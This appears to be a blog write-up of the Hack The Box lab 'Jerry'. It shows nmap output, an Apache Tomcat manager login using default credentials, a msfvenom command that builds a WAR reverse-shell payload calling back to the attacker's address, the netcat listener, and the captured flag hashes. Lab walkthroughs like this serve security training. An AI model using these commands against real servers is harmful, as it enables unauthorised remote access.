[**slyone999’s Security Blog**] (https://slyone999.github.io)

[//]: # (# -- 5 spaces before)
[//]: # (## -- 4 spaces before)
[//]: # (### -- 3 spaces before)
[//]: # (#### -- 2 spaces before)
[//]: # (##### -- 1 space before)

* TOC
{:toc}

# Info#
Machine Name - Jerry
IP Address - 10.10.10.95

# Recon

## NMap

```
nmap -Pn -p 1-65535 -T4 -A -v 10.10.10.95

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 15:46 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating NSE at 15:46
Completed NSE at 15:46, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:46
Completed Parallel DNS resolution of 1 host. at 15:46, 0.02s elapsed
Initiating Connect Scan at 15:46
Scanning 10.10.10.95 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
Connect Scan Timing: About 18.70% done; ETC: 15:49 (0:02:15 remaining)
Connect Scan Timing: About 36.98% done; ETC: 15:49 (0:01:59 remaining)
Connect Scan Timing: About 58.89% done; ETC: 15:49 (0:01:10 remaining)
Connect Scan Timing: About 76.93% done; ETC: 15:49 (0:00:39 remaining)
Completed Connect Scan at 15:49, 156.35s elapsed (65535 total ports)
Initiating Service scan at 15:49
Scanning 1 service on 10.10.10.95
Completed Service scan at 15:49, 6.05s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.95.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.98s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.17s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Nmap scan report for 10.10.10.95
Host is up (0.029s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

NSE: Script Post-scanning.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.04 seconds


Port 8080 apache tomcat 7.0.88

```

Apache Tomcat is listerning on 8080.

Use Dirbuster to search for filepaths

Two interesting returns are manager and host-manager

Try accessing http://10.10.10.95/manager and auth is required.
admin / admin does not work, but pressing cancel returns a page stating 

```

For example, to add the admin-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above. 

```
Authenticating to manager gives you the admin panel.
In the panel there appears to be  way to upload war files.

The URL https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/ describes a way to to create a msfvenom war file.



msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.38 LPORT=1234 -f war > shell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes

kali@kali:~/Documents/HTB/jerry$ nc -lvp 1234
listening on [any] 1234 ...
connect to [10.10.14.38] from jerry [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>type *.txt
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>


